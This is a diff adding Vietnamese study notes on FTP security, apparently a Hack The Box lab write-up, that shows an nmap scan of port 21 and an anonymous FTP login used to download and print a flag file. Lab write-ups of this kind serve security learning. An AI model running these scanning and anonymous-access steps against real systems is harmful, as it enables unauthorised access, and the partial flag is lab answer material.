@@ -12,3 +12,66 @@ TFTP dung UDP thay vi TCP nen khong dang tin cay
 TFTP khong ho tro xac thuc nguoi dung va mat khau
 TFTP thuong chi dung trong mang noi bo an toan hon vi bao mat yeu
 
+Vay lam the nao de tan cong FTP khi khong co mat khau truy cap?????
+O day toi se su dung machine cua Hackthebox de thuc hien bai lab FTP
+
+STEP 1 ENUMERATION: 
+sudo nmap -sV -sC -A -p21  <IP TARGET>
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+┌──(root㉿kali)-[/home/kali]
+└─# nmap -sV -sC -p21 <IP TARGET>
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-27 16:52 +0700
+Nmap scan report for 
+Host is up (0.29s latency).
+
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp
+| fingerprint-strings: 
+|   GenericLines: 
+|     220 InFreight FTP v1.1
+|     Invalid command: try being more creative
+|_    Invalid command: try being more creative
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port21-TCP:V=7.98%I=7%D=5/27%Time=6A16BEFE%P=x86_64-pc-linux-gnu%r(Gene
+SF:ricLines,74,"220\x20InFreight\x20FTP\x20v1\.1\r\n500\x20Invalid\x20comm
+SF:and:\x20try\x20being\x20more\x20creative\r\n500\x20Invalid\x20command:\
+SF:x20try\x20being\x20more\x20creative\r\n");
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 90.18 seconds
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------
+See:
+- Port 21 open
+- Service ftp
+- Version FTP v1.1
+
+STEP 2: EXPLOIT
+
+ftp <IP TARGET>
+Connected to <IP>
+220 InFreight FTP v1.1
+Name (<IP>:kali):anonymous
+331 Anonymous login ok, send your complete email address as your password
+Password: NO PASSWORD 
+Enter
+
+230 Anonymous access granted, restrictions apply
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp>
+ftp> ls -al
+229 Entering Extended Passive Mode (|||30838|)
+150 Opening ASCII mode data connection for file list
+drwxr-xr-x   2 ftpuser  ftpuser      4096 Nov  8  2021 .
+drwxr-xr-x   2 ftpuser  ftpuser      4096 Nov  8  2021 ..
+-rw-r--r--   1 ftpuser  ftpuser       220 Nov  8  2021 .bash_logout
+-rw-r--r--   1 ftpuser  ftpuser      3771 Nov  8  2021 .bashrc
+-rw-r--r--   1 ftpuser  ftpuser        39 Nov  8  2021 flag.txt
+-rw-r--r--   1 ftpuser  ftpuser       807 Nov  8  2021 .profile
+226 Transfer complete
+
+ftp> get flag.txt
+exit
+cat flag.txt
+HTB{b7skjr4c.....}
+
